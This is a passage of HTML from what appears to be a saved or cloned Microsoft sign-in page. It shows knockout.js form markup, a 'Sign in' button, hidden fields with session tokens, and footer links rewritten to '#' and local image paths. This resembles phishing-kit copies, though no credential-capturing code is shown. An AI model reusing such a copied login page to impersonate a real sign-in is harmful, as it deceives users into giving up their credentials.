                                updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  --> <div class="form-group"><!-- ko if: credentialCount > 1 || (credentialCount === 1 && (showForgotUsername || selectedCredShownOnlyOnPicker)) --><!-- /ko --><!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) --><!-- /ko --><!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko --> </div><!-- ko if: credLinkError --><!-- /ko --><!-- /ko --><!-- ko if: evictedCreds.length > 0 --><!-- /ko --><!-- /ko --><!-- ko if: showChangeUserLink --><!-- /ko --> </div> </div> </div> </div> <div class="row" data-bind="css: { &#39;move-buttons&#39;: tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: &#39;footer-buttons-field&#39;,
        params: {
            serverData: svr,
            primaryButtonText: str[&#39;CT_PWD_STR_SignIn_Button&#39;],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: false },
        event: {
            primaryButtonClick: primaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { &#39;no-margin-bottom&#39;: removeBottomMargin }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div class="inline-block"><!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 --> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: primaryButtonAttributes,
            value: primaryButtonText() || str[&#39;CT_PWD_STR_SignIn_Button_Next&#39;],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible,
            preventTabbing: primaryButtonPreventTabbing" value="Sign in"> </div> </div></div> </div> </div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div> </div></div><!-- /ko --> </div><!-- ko if: showFedCredButton --><!-- /ko --><!-- ko if: newSessionMessage() && !svr.urlMsaStaticMeControl --><!-- /ko --><!-- ko if: svr.urlMsaStaticMeControl && newSession() --><!-- /ko --> <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value=""> <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value=""> <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value=""> <input type="hidden" name="canary" data-bind="value: svr.canary" value="z6JeRMRRDbnHcgVLJOTjqBQqQxOupWl0PJudVyP8Au4=5:1"> <input type="hidden" name="ctx" data-bind="value: ctx" value="rQIIAXWRO2_TUACF47xoC4KqC4wdkJCQnPh5E0fqkPeD2E4cO66zRIkfxEns6zg3JLkzA0JCyog6slTqCAOPiU5InTJ3AIkJMSEWGEl_AMsZjo50jr7zOEan6NxDjuX4QWYokMIAsCQn0BQ54BhAsjwLWIaiLZ5iw6ODw_T5ZLspfqu_unz35_ulePuCuD9CKJjn0unlcpmCjuOadsqEXvoDQWwJ4gdBnEUTtk9qnYvoHLBAoDmOAlkAaIYXAJcysMYbOM8ZqoEkPHXFDkX1xmXc1BvTXklEvVLXk6uKazB11sCFibzzJa_OSVUN9cYVV1pTlIilSVOvjCU8QVKpvJJK06moGrysWqPr6D05v0Aj5kZg6GL7d3TfgaHXD-AcncXOCTmw_bpVhL5vmyh1E7N95JoD5EK_FcLADpFrz0_kUQXrvaDoAdkRnmXmGR-zPAyUyrK8KA-h65k6bU1Ub1IAuM3W-mOt2tg1drVTnpJ9A_idzCluISwPnuTXLAOC4o6FJxStBjNuwSWDKLqt12SHUYMmWsGAIfszBYXaOts1SXowehtL7rB60L-K3d2N8l3rOAih407tbZz4Gb9DxXJ7eweHkQeR48jfOPEmsXvrs9TVr784hY_PX3999P5l5CqRxqBhK6KilIZ-zXzabTZkdTwrtGftlbwI9CnVaiys7rqVzS-4Ez5Hb5LEJpn8lSRe3Ip82v_f1_8A0"> <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="57564ec0-c7da-4266-b984-98de27b78a00"> <input type="hidden" id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAADCoMpjJXrxTq9VG9te-7FX6Ncm26aXDVEXbj12olsvGEwURH0ajGLMqGORHbKSLyeh7f0JrLqHmtbMkQo_bjy_kEAkU0QYti8K9Q-cW8fhWmpd-NibQFVQ7LdAClltGbj_-189O5SeUjH3Gf7E-g_T0ckVtKFfQFWjYv9CE9-lmOTYgo1KqNdzqGJNUvf09xLcSUY9Nr0rwK094gPET_Hc62yC703Lfqh6sSuX8FfPOqnJ1UrCxRM--KiqCTfLIXGe6VVg48IYIALjYIQnafihGHsRj-BfPH6AMCmnjMBnZ1A6nWF7QSX2XhJ25PmiHlsUnWZfNws_GTQSltICqlIGzV-gfBT3Exyms6vfsH4FaOp2n7zN-ld2IoGzv4423QU_0_qgDbU6FCZ7yAXBIaV2IAA"> <input type="hidden" name="PPSX" data-bind="value: svr.sRandomBlob" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value=""> <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0"> <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0"> <input type="hidden" name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0"> <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0"> <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input type="hidden" name="i2" data-bind="value: clientMode" value="1"> <input type="hidden" name="i17" data-bind="value: srsFailed" value=""> <input type="hidden" name="i18" data-bind="value: srsSuccess" value=""> <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }"> <div data-bind="component: { name: &#39;footer-control&#39;,
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --><!-- /ko --> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="#">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="#">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str[&#39;CT_STR_More_Options_Ellipsis_AriaLabel&#39;],
        hasFocus: focusMoreInfo()" aria-label="Click here for troubleshooting information"><!-- ko component: { name: 'accessible-image-control', params: { hasDarkBackground: true } } --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --> <!-- ko template: { nodes: [lightImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_0ad43084800fd8b50a2576b5173746fe.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_white_5ac590ee72bfe06a7cecfd75b588ad73.svg" data-bind="imgSrc" src="images/dots.svg"><!-- /ko --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --><!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_5bc252567ef56db648207d9c36a9d004.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/ellipsis_grey_2b5d393db04a5e6e1f739cb266e65b4c.svg" data-bind="imgSrc" src="images/dots.svg"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --> </form> <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl && !svr.urlMsaStaticMeControl --><!-- /ko --><!-- ko if: svr.urlMsaStaticMeControl && callMsaStaticMeControl() --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"></div> <!-- /ko --></div><!--]-->
<div class="cumf_bt_form_wrapper" style="display:none">
</div>

</body></html>